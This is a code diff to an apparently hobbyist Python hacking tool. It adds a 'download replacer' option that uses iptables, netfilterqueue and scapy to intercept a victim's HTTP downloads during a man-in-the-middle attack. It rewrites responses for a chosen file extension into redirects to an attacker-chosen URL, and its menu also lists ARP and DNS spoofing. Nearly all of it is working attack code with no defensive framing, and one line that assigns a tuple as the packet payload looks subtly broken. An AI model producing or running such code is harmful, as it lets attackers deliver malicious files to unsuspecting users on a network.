@@ -257,11 +257,56 @@ def dns_spoof():
     os.system('iptables -I OUTPUT -j NFQUEUE --queue-num {}'.format(que_num))
     os.system('iptables -I INPUT -j NFQUEUE --queue-num {}'.format(que_num)) 
     os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format(que_num)) 
+
+def download_replacement():
+    import scapy.all as scapy
+    import netfilterqueue
+    import os
+    ack_lst = []
+    print('this tool will replace any files downloaded(you can specify the file ext) by your victim(to target or start the man in the middle use arp spoof tool)')
+    print('note: this will also replace any files you download with the certain extension while the program is running')
+    qnum= input('enter the number you want queue to be in(if confused, enter 3): ')
+    #https://www.win-rar.com/postdownload.html?&L=0
+    replace_file_ext= input('enter the extension of the file you wanna replace: ')
+    file_replaced = input('enter the download url of file you wanna download inplace of the real file:')
+    def replace_download(packet):
+        
+        scapy_packet = scapy.IP(packet.get_payload())
+        if scapy_packet.haslayer(scapy.Raw):
+            if scapy_packet[scapy.TCP].dport == 80:
+                print('[+] HTTP Request', scapy_packet[scapy.TCP].ack)
+                if bytes(replace_file_ext,encoding='utf=8') in scapy_packet[scapy.Raw].load:
+                    ack_lst.append(scapy_packet[scapy.TCP].ack)
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print('[+] HTTP Response', ack_lst)
+                if scapy_packet[scapy.TCP].seq in ack_lst:
+                    print('[+] Replacing File')
+                    ack_lst.remove(scapy_packet[scapy.TCP].seq)
+                    scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: ', file_replaced,'\n\n'
+                    del scapy_packet[scapy.IP].len
+                    del scapy_packet[scapy.IP].chksum
+                    del scapy_packet[scapy.TCP].chksum
+                    packet.set_payload(bytes(scapy_packet))
+        packet.accept()
+    
+
+    os.system('iptables -I OUTPUT -j NFQUEUE --queue-num {}'.format(qnum))   
+    os.system('iptables -I INPUT -j NFQUEUE --queue-num {}'.format(qnum)) 
+    os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format(qnum))
+    print('ip tables set')
+    nfqueue = netfilterqueue.NetfilterQueue()
+    nfqueue.bind(int(qnum), replace_download)
+    print('queue binded')
+    print('waiting for response...')
+    nfqueue.run()
+    
+
+
     try:
         queue = netfilterqueue.NetfilterQueue()
         queue.bind(que_num, process_packet)
         queue.run()
-    except:
+    except KeyboardInterrupt:
         os.system('iptables -F')
         print('CTRL + C detected, flushing ip table and cleaning things up')
 try:
@@ -274,8 +319,9 @@ try:
         print(Fore.LIGHTGREEN_EX, '5.mac changer')
         print(Fore.LIGHTGREEN_EX,'6. network scanner')
         print(Fore.LIGHTGREEN_EX, '7. arp spoofer')
-        print(Fore.LIGHTGREEN_EX, '8.packet sniffer')
-        print(Fore.LIGHTGREEN_EX, '9. dns spoof(allows you to redirect websites)')
+        print(Fore.LIGHTGREEN_EX, '8.packet sniffer(http only, soon https)')
+        print(Fore.LIGHTGREEN_EX, '9. dns spoof(allows you to redirect websites),(http only, soon https)')
+        print(Fore.LIGHTGREEN_EX, '10. dowload replacer(http only, soon https)')
         print(Fore.LIGHTRED_EX,'input exit to exit')
         print(Fore.LIGHTGREEN_EX,'-')
         
@@ -298,6 +344,10 @@ try:
             packet_sniffer()
         elif inpt == '9':
             dns_spoof()
+        elif inpt == '10':
+            download_replacement()
+        elif inpt == '!) TOOLS':
+            print('YAY, FINNA HIT 10 TOOLS!!!')
         elif inpt == 'exit':
             print(Fore.LIGHTRED_EX, 'cya!')
             break
